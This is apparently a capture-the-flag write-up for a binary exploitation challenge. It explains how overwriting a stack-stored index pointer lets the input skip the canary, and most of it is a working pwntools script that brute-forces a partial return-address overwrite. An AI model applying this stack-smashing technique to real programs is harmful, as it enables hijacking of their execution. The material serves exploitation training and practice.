![](img/Loop%20Lunacy%20Hard-1780623878573.webp)

it seems that the binary read each byte into the stack (see read( ,  , 1uLL))

![](img/Loop%20Lunacy%20Hard-1780623952591.webp)

check the stack we discover that the binary store the pointer after our input start (note that the pointer update after our input, so the pointer is '1' after my AA input)

from here, the solution becomes apparent, as we can 'jump' bytes (skip over some bytes without modifying them) by modifying the pointer

this allow us to modify the return address without disturbing the canary

```
#!/usr/bin/python3

from pwn import *

context.arch="amd64"
context.os="linux"
context.log_level="debug"

script='''
b*challenge+208
'''

while True:
	p=process("./loop-lunacy-hard")
	
	payload=b"A"*0x64+b"\x76"
	
	p.recvuntil("Payload size: ")
	p.sendline(str(0x7a).encode())
	p.recvuntil(" bytes)!")
	p.sendline(payload)
	  
	# gdb.attach(p, gdbscript=script)
	# pause()
	  
	time.sleep(0.3)
	payload="\x4f\x8d"
	p.sendline(payload)
	
	try:
		p.recvuntil("flag", timeout=1.5)
		break
	except:
		pass

p.interactive()
```